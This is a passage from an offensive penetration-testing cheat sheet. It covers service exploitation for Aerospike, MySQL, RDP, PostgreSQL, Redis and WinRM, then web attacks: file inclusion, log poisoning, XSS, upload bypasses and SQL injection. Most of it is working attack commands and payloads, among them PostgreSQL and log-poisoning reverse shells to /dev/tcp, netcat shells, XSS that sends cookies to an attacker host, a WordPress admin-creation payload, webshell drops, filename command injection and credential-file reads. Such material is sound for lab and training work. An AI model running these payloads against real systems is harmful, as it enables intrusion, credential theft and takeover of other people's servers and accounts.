Connect to probe available commands, then exploit CVE-2020-13151 if the target runs a vulnerable Aerospike REST API.

  • config-get may reveal credentials or sensitive paths; namespaces and sets reveal stored data structures.
  • CVE-2020-13151 — unauthenticated RCE in Aerospike Database Server via the REST API; requires port 3000 access alongside 3003.
  • Port 3000 is the main Aerospike service port; port 3003 is fabric/heartbeat; the REST gateway typically runs on port 8080.
nc -nv [ip] 3003
# CVE-2020-13151 - Aerospike REST API RCE
wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py
python3 cve2020-13151.py --ahost=[ip] --aport=3000 --pythonshell --lhost=[local_ip] --lport=443
nc -nlvp 443

2.21 3306: MYSQL

Enumerate MySQL databases and user privileges, then abuse FILE privileges to read or write files for escalation.

  • SELECT ... INTO OUTFILE '/var/www/html/shell.php' drops a webshell if the MySQL user has FILE privilege and the web root is writable by the MySQL process.
  • Run SHOW VARIABLES LIKE 'secure_file_priv'; immediately after login; empty = no restriction, NULL = file ops disabled, a path = writes confined to that directory.
  • SELECT LOAD_FILE('/etc/passwd'); and SELECT LOAD_FILE('/home/[user]/.ssh/id_rsa'); expose credentials without OS-level access.
  • Hash dumping: SELECT user, authentication_string FROM mysql.user; — crack with hashcat mode 3200 (bcrypt) or 300 (older mysql323/mysql41 hashes).
nmap -sV -p 3306 --script "mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122" [ip]
crackmapexec mysql -d [database] -u [user] -p [password] -x "SHOW DATABASES;" [ip]
hydra -l [user] -P [password_list] -s 3306 -vV [ip] mysql
mysql -h [ip] -u [user] -p [database]
-- database usage
SHOW DATABASES;
USE <database_name>;
SHOW TABLES;
DESCRIBE <table_name>;
SELECT * FROM <table_name>;

-- user enumeration
SELECT user FROM mysql.user;

-- privilege escalation
GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
# check DB user's OS-level write privileges
SELECT LOAD_FILE('C:\\xampp\htdocs\\ncat.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';
icacls 'C:\\xampp\htdocs\nc.exe'

2.22 3389: RDP

Enumerate RDP encryption and known CVEs, then brute-force or spray credentials before connecting with xfreerdp or rdesktop.

  • BlueKeep (CVE-2019-0708) affects Windows 7/Server 2008; DejaBlue (CVE-2019-1181/1182) affects Windows 8/10/Server 2012–2019.
  • Pass-the-Hash via RDP — with Restricted Admin mode enabled (DisableRestrictedAdmin = 0), authenticate using only an NTLM hash: xfreerdp /pth:[hash].
  • Session hijacking — query user lists active/disconnected sessions; tscon [session_id] /dest:console hijacks a disconnected session without knowing the user's password.
  • Enable RDP remotely: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
nmap --script "rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info,rdp-banner" -p 3389 [ip]
hydra -L [user_list] -P [password_list] -s 3389 rdp://[ip]
crowbar -b rdp -s [ip]/32 -U users.txt -C rockyou.txt
crackmapexec rdp [ip] -u users.txt -p rockyou.txt
xfreerdp /cert-ignore /bpp:8 /compression /themes /wallpaper /auto-reconnect /h:1000 /w:1600 /v:[ip] /u:[user] /p:[password]
xfreerdp /u:[user] /v:[ip] /cert:ignore /p:[password] /timeout:20000 /drive:[drive_name],[local_path]
xfreerdp /compression +auto-reconnect /u:[user] /p:[password] /v:[ip] +clipboard /size:1920x1080 /drive:desktop,/home/[user]/Desktop
rdesktop -u [user] -p [password] -g 1920x1080 [ip]
rdesktop [ip]

2.23 5432, 5433: PostgreSQL

Enumerate PostgreSQL version and credentials, then use COPY FROM PROGRAM for OS command execution or a reverse shell.

  • COPY FROM PROGRAM executes a shell command and writes stdout into a table column; runs as the OS user of the PostgreSQL service (often postgres).
  • The reverse shell command must be backgrounded or the SQL statement will hang; use & at the end or a shell that forks.
  • CVE via 50847.py targets PostgreSQL 11.3–11.9.
  • pg_hba.conf with trust requires no password regardless of account — try psql -h [ip] -U postgres without -W.
nmap -sV -p 5432,5433 --script "postgresql-info,postgresql-user-enum,postgresql-ssl" [ip]
hydra -L users.txt -P passwords.txt -s 5432 [ip] postgresql
crackmapexec postgres -d [db] -u [user] -p [password] -t [ip]
psql -h [ip] -p 5432 -U [user] -W

# RCE for PostgreSQL 11.3 - 11.9
python3 50847.py -i [ip] -p 5437 -c "busybox nc [attacker_ip] 80 -e sh"
# COPY FROM PROGRAM - RCE proof of concept
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

# COPY FROM PROGRAM - reverse shell
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'sh -i >& /dev/tcp/[attacker_ip]/8080 0>&1';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
-- database usage
\l
\c <DB_NAME>
\dt
\d <TABLE_NAME>
\d+ <TABLE_NAME>
SELECT * FROM <TABLE_NAME>;
SELECT * FROM users WHERE attribute = 'value';
SELECT table_name, column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'public';
CREATE TABLE test_table (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
INSERT INTO test_table (name) VALUES ('example_data');
UPDATE test_table SET name = 'updated_data' WHERE id = 1;
DELETE FROM test_table WHERE id = 1;

2.24 5900: VNC (Virtual Network Computing)

Enumerate VNC authentication type and brute-force credentials; default and blank passwords are common on poorly configured servers.

  • Authentication type 1 = no auth required; type 2 = VNC password; types 16–19 = TLS/RSA.
  • VNC passwords in ~/.vnc/passwd use a fixed DES key — recover with vncpasswd -t < passwd_file.
  • VNC ports follow 5900 + display_number; scan 5900–5910 to identify all sessions on a host.
nmap -p 5900 --script vnc-info,vnc-auth-bypass [ip]
vncviewer [ip]:5900
vncviewer -passwd /path/to/passwordfile [ip]:5900
hydra -L [user_list] -P [password_list] vnc://[ip]

2.25 5985, 5986: WinRM

Test WinRM for valid credentials, then use Evil-WinRM from Kali or Enter-PSSession from Windows to get an interactive shell.

  • CrackMapExec showing (Pwn3d!) means the account is a local admin and will get a shell.
  • Evil-WinRM supports upload/download, in-memory PowerShell script loading (-s), and Pass-the-Hash (-H [hash]).
  • WinRM is quieter than PsExec since it does not write a service binary to disk.
  • Enable WinRM remotely: Enable-PSRemoting -Force or winrm quickconfig -quiet.
nmap -p 5985,5986 --script winrm-info [ip]
crackmapexec winrm [ip] -u [user] -p [password]
evil-winrm -i [ip] -u [user] -p [password]
# connect from Windows
Enter-PSSession -ComputerName [ip] -Credential (Get-Credential)

2.26 6379: Redis

Enumerate Redis configuration and data, then exploit unauthenticated access for RCE via file-write or a rogue server.

  • File-write RCE: CONFIG SET dir /var/www/html, CONFIG SET dbfilename shell.php, SET x "<?php system($_GET['cmd']); ?>", then BGSAVE.
  • SSH authorized_keys: CONFIG SET dir /root/.ssh, CONFIG SET dbfilename authorized_keys, SET x "\n\nssh-rsa [key]\n\n", BGSAVE.
  • Cron RCE: CONFIG SET dir /var/spool/cron/crontabs, CONFIG SET dbfilename root, write cron payload, BGSAVE.
  • Run ACL LIST to enumerate users and permissions in Redis 6+.
nmap -p 6379 --script "redis-info,redis-rce" [ip]
redis-cli -h [ip] -p 6379 -a [password]
searchsploit redis
python3 redis-rogue-server.py -p 6379
python3 redis-rce-exploit.py -h [ip] -p 6379 -c "payload"
redis-cli -h [ip] -p 6379
info
keys *
select [db_number]
set mykey myvalue
get mykey
config get *
shutdown

References: Redis pentesting (HackTricks) | Redis Rogue Server | Redis RCE

2.27 Unknown Port

Banner-grab with netcat, then probe with help commands to determine the protocol before applying targeted techniques.

  • Always try curl http://[ip]:[port]/ and curl https://[ip]:[port]/ — many custom services are HTTP APIs.
  • If netcat receives binary gibberish, try openssl s_client -connect [ip]:[port] to read the cleartext banner under TLS.
  • Run nmap -sV -p [port] --version-intensity 9 for aggressive version detection when default scans fail.
  • Protocol probes: OPTIONS / HTTP/1.0\r\n\r\n (HTTP), EHLO test\r\n (SMTP-like), USER anonymous\r\n (FTP-like), PING\r\n / info\r\n (management protocols).
nc -nv [ip] [port]
echo -e "[user]\n[password]" | nc -nv [ip] [port]
echo "list" | nc -nv [ip] [port]

3. Vulnerability Scanning

Run after port discovery; save results with -oX, -oG, or -oN for triage and reporting.

3.1 Nessus

Plugin-based scanner; credentialed scans (SSH/SMB) surface patch-level findings that unauthenticated scans miss.

# Download from https://www.tenable.com/downloads/nessus — verify hash before installing
sha256sum -c sha256sum_nessus
sudo apt install ./Nessus-10.5.0-debian10_amd64.deb
# Start Nessus — configure at https://127.0.0.1:8834
sudo systemctl start nessusd.service
# Update plugins before a lab session
sudo /opt/nessus/sbin/nessuscli update --all

3.2 Nmap NSE (Nmap Scripting Engine)

NSE scripts live in /usr/share/nmap/scripts/; pair with -sV so version info is available to scripts.

Category Purpose Safe to run in authorized labs?
default Scripts run automatically with -sC; cover banner grabbing, common service enumeration, and basic info-disclosure checks. Selected for speed and low intrusiveness. Yes — low noise, broadly safe; equivalent to -sC shorthand.
safe Scripts considered unlikely to crash services or perform harmful actions. Includes deeper enumeration (HTTP headers, SSL certs, DNS records) beyond the default set. Yes — designed to be non-destructive; good first pass against any in-scope host.
vuln Tests for specific known vulnerabilities (e.g., EternalBlue, Shellshock, Heartbleed) by sending targeted probes and checking for vulnerable responses. Does not exploit. Generally yes — probes only, no payload delivery; can generate IDS alerts and may cause instability on very fragile services.
discovery Actively queries public registries, DNS, SNMP, and other sources to learn more about the target network topology and asset inventory. Yes — mostly read-only queries; may contact external third-party services (WHOIS, DNS resolvers), which can leak information about the scan.
auth Attempts to authenticate to services using default or empty credentials (e.g., anonymous FTP, default SNMP community strings, unauthenticated Redis). Reports when access is granted. Yes, with care — no brute-force; only tests well-known defaults. Can trigger account-lockout policies if the service enforces them.
brute Performs credential brute-force attacks against services such as SSH, FTP, SMB, HTTP Basic Auth, and databases using built-in or supplied wordlists. Only with explicit written permission — highly intrusive; will lock accounts, fill logs, and is trivially detected.
exploit Actively exploits vulnerabilities to gain access or demonstrate impact (e.g., code execution, file read). Goes beyond detection — delivers a payload. Only in isolated lab environments — can cause system compromise, data loss, or crashes; treat the same as running a Metasploit module.
dos Sends traffic patterns designed to deny service or crash target processes. Used to confirm denial-of-service conditions. No — will crash services or make hosts unreachable; avoid unless the sole purpose of the engagement is DoS testing with explicit authorisation.
malware Detects signs of malware infection on a host (e.g., backdoors, trojaned services, known C2 beacon patterns). Yes — detection only, not deployment; useful during incident-response style lab exercises.
intrusive Scripts that are more aggressive than safe but stop short of full exploitation; may send unusual traffic volumes or modify service state (e.g., create test accounts, write temp files). Use with caution — can disrupt services or leave artefacts; always clean up and confirm scope before running.
external Scripts that send data to or query third-party services (e.g., Shodan, VirusTotal, WHOIS servers) to enrich results. Contextual — the scan target data may be sent off-box; verify this is acceptable under engagement rules of engagement and data-handling policies. 
nmap --script [scriptName] [ip]
nmap --script-help [scriptName]
# Add a new script and rebuild the database
sudo cp /path/to/script.nse /usr/share/nmap/scripts/
sudo nmap --script-updatedb
# Broad vuln check
sudo nmap -sV --script vuln [ip]

# Safe scripts — good starting point
sudo nmap -sV -sC --script safe [ip]
# Targeted CVE script
sudo nmap -sV -p [port] --script "http-vuln-cve2021-41773" [ip]

4.1 Enumeration

Fingerprinting

Identify the server, framework, and CMS before attempting exploits — knowing the stack lets you target version-specific CVEs and default credentials.

Signal Where Found What It Reveals Example / Notes
Server: header HTTP response Web server product and version Apache/2.4.49, Microsoft-IIS/10.0 — cross-ref with CVE lists

Session cookie name Set-Cookie header Language / framework PHPSESSID → PHP; JSESSIONID → Java; ASP.NET_SessionId → .NET

CSS/JS path patterns Page source, DevTools Framework structure, CMS install path /wp-content/ → WordPress; /sites/default/files/ → Drupal

whatweb -a 3 [ip]
nikto -ask=no -h http://[ip] 2>&1
# HTTP headers — Server, X-Powered-By, cookies, allowed methods

# SSL certificate — CN, SANs, issuer
openssl s_client -connect [ip]:443

Directory & File Discovery

Brute-force paths not linked from the visible site — admin panels, backup files, and config files are routinely forgotten and left accessible.

Tool Strength Best For Typical Command
ffuf Very fast; flexible filtering (-fs, -fc, -fw, -fl); multi-wordlist; proxy support Primary tool for directory, file, vhost, and parameter fuzzing ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://[ip]/FUZZ -fc 404 -t 40
gobuster Compiled Go binary; fast; clean output; dir, dns, vhost modes Quick dir/file sweeps; DNS subdomain brute-force gobuster dir -u http://[ip] -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 40 -o out.txt
feroxbuster Recursive by default; auto-follows new directories; Rust speed Deep directory trees where manual recursion would be slow feroxbuster -u http://[ip] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,aspx,html -k -C 404 -t 30

dirsearch Python; built-in extension list; recursive; handles redirects well When you want built-in extension handling without specifying every ext manually dirsearch -u http://[ip] -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e php,html,txt -t 50 --exclude-status=400,404

Exposed .git Directory

An exposed .git/ directory allows full source-code reconstruction, revealing credentials, internal paths, and application logic not visible from the running app.

# git-dumper — download and reconstruct an exposed .git repo
git-dumper http://[ip]/.git website_git

grep -r 'password' .
grep -r 'apikey' .

git log
git show [commitID]
# Alternative: gitdumper.sh + extractor.sh
./gitdumper.sh http://[domain]/.git/ /path/to/save/git
cd /path/to/git && git status
git reset --hard
./extractor.sh /.git/ extracted
# Manual wget dump when no tool is available
sudo wget -r http://[ip]/.git/
cd [ip]
sudo git show

CMS Scanning

CMS platforms have large plugin/theme ecosystems; a single outdated plugin frequently provides unauthenticated RCE or file-upload vulnerabilities.

# wpscan — WordPress enumeration and brute force
wpscan --url http://[ip]/wp/
wpscan --url http://[ip]/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
wpscan -u "http://[ip]/" --wp-content-dir "[custom-path]"
wpscan -u "http://[ip]/" --enumerate u
wpscan --url http://[ip]/ --enumerate vp
wpscan --url http://[ip]/ --enumerate p --plugins-detection aggressive
# droopescan — Drupal CMS scanner
droopescan scan drupal -u [target_url]
# malicious-wordpress-plugin — generate a plugin-based reverse shell
# https://github.com/wetw0rk/malicious-wordpress-plugin
python3 wordpwn.py [lhost] [lport] Y
# cewl — generate a custom wordlist from target site content
cewl -w wordlist.txt "http://[ip]/" --with-numbers

# expand wordlist with mutation rules
john --wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt

WebDAV

WebDAV extends HTTP with file-management methods (PUT, MOVE, DELETE); when enabled with weak credentials on IIS, it allows direct file upload to a web shell.

# nmap — confirm WebDAV is enabled and list allowed methods
nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ [ip]
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ [ip]
# cadaver — interactive WebDAV client
cadaver [ip]
# davtest — probe which file extensions IIS will execute after upload
davtest -url http://[ip]
davtest -auth [user]:[pass] -url http://[ip]/webdav
# Generate payload, upload, catch shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ip] LPORT=80 -f aspx -o shell.aspx
curl -T 'shell.aspx' 'http://[ip]/' -u [user]:[pass]
nc -nvlp 80
# Browse to http://[ip]/shell.aspx to trigger
# MOVE bypass — upload as .txt, rename to .aspx
curl -X MOVE -H "Destination: http://[ip]/shell.aspx" http://[ip]/shell.txt -u [user]:[pass]

API Enumeration

REST APIs are often less hardened than the main UI — they may expose endpoints lacking authentication, accept predictable IDs, or return verbose errors confirming valid usernames.

# Probe API root and resources
curl http://[ip]/api/
curl http://[ip]/api/user/

# Common versioning pattern: /api_name/v1

# Wildcard query against a search endpoint
curl -X GET "http://[ip]:[port]/search?query=*"

# POST JSON credentials to a login endpoint
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://[ip]:[port]/users/v1/login

# GraphQL introspection — dump full schema
curl -X POST http://[ip]/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# Route all API traffic through Burp
--proxy 127.0.0.1:8080

Recommended wordlists for web enumeration:

  • Directory: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  • File: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  • SecLists common: /usr/share/seclists/Discovery/Web-Content/common.txt
  • SecLists big: /usr/share/seclists/Discovery/Web-Content/big.txt
  • LFI (Linux): SecLists/default-web-root-directory-linux.txt
  • LFI (Windows): SecLists/default-web-root-directory-windows.txt
  • LFI general: SecLists/LFI-Jhaddix.txt
  • Payloads reference: PayloadsAllTheThings — XSS Injection

4.2 Directory Traversal & File Inclusion

A web app that builds a filesystem path from user input without sanitising it lets us step outside the web root with ../ sequences (directory traversal — read only) or, when the value is passed to an include()/require() call, force the server to execute attacker-controlled content (LFI/RFI — code execution).

  • Hunt for parameters whose value looks like a file or page: ?page=admin.php, ?file=, ?lang=en.html, ?template=, ?download=. Hover every link, read the page source, and try navigating to the referenced file directly to confirm it is served from disk.
  • Traversal vs inclusion: if the response shows the source code of a .php file, it is a traversal (the file is read and returned). If the file is executed (you see its rendered output), it is a file inclusion — the route to RCE.
  • Spam extra ../ — there is nowhere further back than /, so a long chain guarantees you reach root even without knowing the current working directory.
  • Windows targets: swap to backslashes (..\..\) and target files like C:\Windows\System32\drivers\etc\hosts, C:\Windows\System32\config\SAM, or C:\inetpub\wwwroot\web.config.
  • High-value reads: /etc/passwd, SSH keys (/home/<user>/.ssh/id_rsa), web config/source (config.php, wp-config.php, .env), and app logs for poisoning.
  • CVE-2021-41773 / 42013 — Apache 2.4.49/2.4.50 path traversal: a mod_cgi-enabled server can be pushed to RCE; the plain ../ is filtered, so URL-encode the dots as %2e%2e.
Technique Payload / Command Notes
Basic traversal (Linux) curl http://TARGET/index.php?page=../../../../../../etc/passwd Read files outside the web root; add more ../ than you think you need.
URL-encoded bypass curl http://TARGET/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd Defeats naive filters that only match the literal ../ string (e.g. Apache 2.4.49).
Double / overlong encoding %252e%252e%252f · ..%c0%af · ..%u2215 Try when single encoding is also filtered — server decodes twice or interprets Unicode slashes.
Null-byte truncation (PHP < 5.3.4) ?page=../../../../etc/passwd%00 Strips a forced .php suffix on legacy PHP; rarely works on modern targets.
Path/extension append bypass ?page=../../../../etc/passwd%00.php · append ? or # When the app concatenates a fixed extension to your input. 
# Read SSH private key, then log in
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../home/offsec/.ssh/id_rsa
# Read Apache config to map virtual hosts / web roots
curl http://TARGET/index.php?page=../../../../../../etc/apache2/sites-enabled/000-default.conf

4.2.1 LFI to RCE — Log Poisoning

When a file-inclusion parameter executes the file it loads, write PHP into a file the server already controls (a log we can taint), then include that log to run our code. The classic vector is the Apache access/error log via the User-Agent header.

# 1. Confirm we can include the log file (entries appear in the response)
curl http://TARGET/index.php?page=../../../../../../../var/log/apache2/access.log

# 2. Poison the log: send a request whose User-Agent contains PHP (use Burp Repeater)
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/

# 3. Include the log and pass commands via the cmd parameter
curl "http://TARGET/index.php?page=../../../../../../../var/log/apache2/access.log&cmd=id"

# 4. Upgrade to a reverse shell
curl "http://TARGET/index.php?page=../../../../../var/log/apache2/access.log&cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261'"
  • Other poisonable sinks: /var/log/auth.log (inject PHP into the SSH username — ssh '<?php ... ?>'@TARGET), mail logs (/var/log/mail.log via SMTP RCPT TO), and /proc/self/environ (older PHP — User-Agent lands in the environment block).
  • Nginx/IIS log paths differ: /var/log/nginx/access.log, C:\inetpub\logs\LogFiles\.

4.2.2 PHP Wrappers

PHP stream wrappers transform or supply content inside an inclusion. php://filter exfiltrates source code that would otherwise execute; data:// and php://input deliver fresh PHP code directly (both need allow_url_include=On).

# Read PHP SOURCE instead of executing it — base64 so tags don't break the page
curl "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=admin.php"
# decode the returned blob locally
echo "<base64-blob>" | base64 -d

# data:// wrapper — execute inline PHP (needs allow_url_include=On)
curl "http://TARGET/index.php?page=data://text/plain,<?php%20echo%20system('id');?>"

# data:// with base64 to slip past keyword filters (e.g. WAF blocking 'system')
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://TARGET/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=id"

# php://input — POST the PHP code in the request body
curl -s "http://TARGET/index.php?page=php://input&cmd=id" --data "<?php echo system(\$_GET['cmd']);?>"

See the wrapper reference table under 4.6 XXE for the full zip://, phar://, expect://, and chained-filter syntax.

4.2.3 Remote File Inclusion (RFI)

RFI is rarer than LFI because the target needs allow_url_include=On, but it is the fastest path to a shell: host a webshell on your box and have the target include it over HTTP.

# 1. Serve a webshell from Kali (Kali ships one at /usr/share/webshells/php/simple-backdoor.php)
cd /usr/share/webshells/php/ && python3 -m http.server 80

# 2. Include it remotely and run commands
curl "http://TARGET/index.php?page=http://YOUR_IP/simple-backdoor.php&cmd=id"

# Trailing null byte / query trick if the app appends an extension
curl "http://TARGET/index.php?page=http://YOUR_IP/shell.php%00"
curl "http://TARGET/index.php?page=ftp://YOUR_IP/shell.php"

4.3 Cross-Site Scripting (XSS)

XSS injects attacker JavaScript that runs in another user's browser under the application's origin — used to steal session cookies, forge authenticated requests (CSRF-style account takeover), and pivot into the admin panel. Always identify which characters survive (< > " ' /) and where your input lands (HTML body, attribute, JS context) before crafting the payload.

Type Where it lives Impact
Stored (persistent) Saved server-side (comment, profile, plugin field, User-Agent logged to an admin dashboard) Highest — fires for every victim who views the page; ideal for admin takeover.
Reflected Echoed straight back from the request (search box, error message) Needs a delivered link; runs once per click.
DOM-based Client-side JS writes location/innerHTML without sanitising Never touches the server; find it by reading the JavaScript. 
<!-- Detection: confirm script execution -->
<script>alert(42)</script>
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(1)>
<!-- Break out of an attribute context first -->
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
<!-- Inject via a header that gets reflected/stored (e.g. User-Agent) -->
User-Agent: <script>alert(42)</script>
  • HttpOnly blocks document.cookie theft — when set (e.g. WordPress session cookies), pivot to forcing an authenticated action instead of stealing the cookie.
  • If </> are filtered but you are inside an existing tag, use an event handler (onmouseover=, onerror=) or break the attribute with ".
  • To survive Burp/transport mangling, minify the JS and deliver it through eval(String.fromCharCode(...)) so it contains no quotes or angle brackets.
// Cookie theft (only if HttpOnly is NOT set) — exfil to your listener
<script>new Image().src='http://YOUR_IP/c?'+document.cookie</script>
fetch('http://YOUR_IP/c?'+btoa(document.cookie));
// Stored-XSS admin takeover: fetch the nonce, then create a new admin (WordPress)
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user=" + nonce +
  "&user_login=attacker&email=a@a.com&pass1=Attacker123!&pass2=Attacker123!&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
// Encode the minified payload so it carries no quotes/brackets through the sink
function encode_to_javascript(string) {
  var input = string;
  var output = '';
  for (pos = 0; pos < input.length; pos++) {
    output += input.charCodeAt(pos);
    if (pos != (input.length - 1)) output += ",";
  }
  return output;
}
let encoded = encode_to_javascript('insert_minified_javascript');
// Deliver as: <script>eval(String.fromCharCode(ENCODED))</script>

4.4 File Upload

Bypass upload controls to plant a webshell; success requires defeating extension/MIME filters and locating the file's web-accessible path.

Technique Defeats Example Notes / Preconditions
Remove JS validator Client-side extension check Delete onchange handler in DevTools Server-side filter still applies; follow up with Burp if rejected
Burp intercept + rename Client-side check, MIME header Upload shell.jpg, intercept, rename to shell.php Changes filename and/or Content-Type after browser validation
Alternate PHP extension Extension blacklist shell.phtml, shell.phar, shell.php7 Server must be configured to execute the alternate extension
Double extension Non-anchored whitelist regex shell.php.jpg Apache AddHandler or mod_mime must process any matching extension in the name
.htaccess injection Extension whitelist (Apache) AddType application/x-httpd-php .dork Requires Apache with AllowOverride All; upload .htaccess first, then payload as shell.dork
Null-byte injection Extension check in PHP < 5.3.4 shell.php%00.jpg Only works on very old PHP; confirm version before trying
GIF magic bytes prepend MIME content inspection (finfo, mime_content_type) GIF89a;<?php system($_GET['cmd']); ?> File must be stored verbatim; re-encoding by GD/ImageMagick strips the payload
EXIF comment injection Content inspection that only checks headers exiftool -Comment='<?php … ?>' lo.jpg Surviving upload depends on no image re-processing pipeline being applied
Case variation Case-sensitive blacklist shell.pHP, shell.PhP Linux filesystem is case-sensitive but the blacklist check may not be
Filename OS command injection N/A — exploits mv-based handler |echo BASE64|base64 -d|bash".jpg Only fires when server uses shell-based file move, not move_uploaded_file()

4.4.1 Disabling Frontend Validation

  1. Use the Browser Inspector to locate and delete the JavaScript validation function, then upload the file directly.
  2. Use BurpSuite to intercept a legitimate upload request, modify the file content and filename in the intercepted request, then forward it.

4.4.2 Extensions Blacklist Bypass

Fuzz with web-extensions.txt via ffuf or BurpSuite Intruder (disable URL encoding).

.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg

4.4.3 Extensions Whitelist Bypass

A regex that checks for the allowed extension anywhere in the name (not anchored to the end) can be abused with double extensions.

# Vulnerable whitelist check - matches anywhere, not end-anchored
$fileName = basename($_FILES["uploadFile"]["name"]);
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}

# Secure check (end-anchored $ - double extension won't work against this)
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }

4.4.4 Bypassing Filters

Layer extension variation, .htaccess abuse, and MIME spoofing when a single method fails.

# PHP variants - try when .php is blocked
.pHP .phps .php7 .php4 .php5 .php3 .xxx

# ASP(X) variants
.aspx .asp .ashx .asmx
# .htaccess abuse - upload .htaccess first, then payload as [file].dork
echo "AddType application/x-httpd-php .dork" > .htaccess
# Character injection - inject before or after the final extension
# shell.php%00.jpg — PHP < 5.X truncates at %00, stores as shell.php
%20  %0a  %00  %0d0a  /  .\  .  …  :

# Generate all permutations automatically
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.phar' '.hphp'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

3.4.4.5 MIME Type Spoofing

Prepend GIF magic bytes (GIF8 or GIF89a) to fool mime_content_type() / finfo checks; GIF is preferred because its signature is printable ASCII.

# GIF magic bytes + PHP payload
GIF89a;
<?
system($_GET['cmd']);
?>
# Confirm magic bytes are correct locally
echo "GIF8" > text.jpg
file text.jpg

4.4.5 File Execution

After a successful upload, access the file via its web path to execute the shell; use revshells.com to generate reverse shell one-liners.

http://[TARGET_IP]/uploads/shell.php
http://[TARGET_IP]/uploads/shell.php?cmd=whoami

4.4.6 Embed Code into Images

Use exiftool to inject PHP into an image's EXIF comment field; verify the comment survived upload before relying on this vector.

exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg

# Rename to trigger PHP processing via double-extension or .htaccess rule
mv lo.jpg lo.php.jpg

4.4.7 Embed Code into File Names

If the application moves uploaded files via a shell command, shell metacharacters in the filename inject OS commands at the mv call.

echo "bash -i >& /dev/tcp/[ip]/444 0>&1" | base64

# Filename carries the injection — runs when server executes: mv <filename> /tmp/
cp cat.jpg '|smile"`echo <base64_bash_reverse_shell> | base64 -d | bash`".jpg'

4.5 SQL Attacks

Covers direct DB connections, SQL injection (error-based, UNION, blind, truncation), and database-specific RCE for MySQL, MSSQL, MariaDB, and Oracle.

Type How Detected Output / Signal Key Payload Shape Typical Tools
Error-based SQL error message reflected in HTTP response (500, inline text) Database version, table/column names embedded in error string ' OR 1=1 IN (SELECT @@version) -- // Manual, sqlmap --technique=E
UNION-based Injected ORDER BY increments until error; then UNION with NULLs Extracted data appears in a visible column of the normal page response ' UNION SELECT NULL,@@version,NULL -- - Manual, sqlmap --technique=U
Boolean blind Page differs between AND 1=1 (true) and AND 1=2 (false) Binary true/false page difference; data extracted char-by-char via SUBSTRING + ASCII ' AND ASCII(SUBSTR(database(),1,1))=97 -- + wfuzz loops, sqlmap --technique=B
Time-based blind Response delay when condition is true vs. immediate response when false No data in body; inferred from HTTP response latency ' AND IF(1=1,SLEEP(5),0) -- + / WAITFOR DELAY '00:00:05' wfuzz with timing grep, sqlmap --technique=T
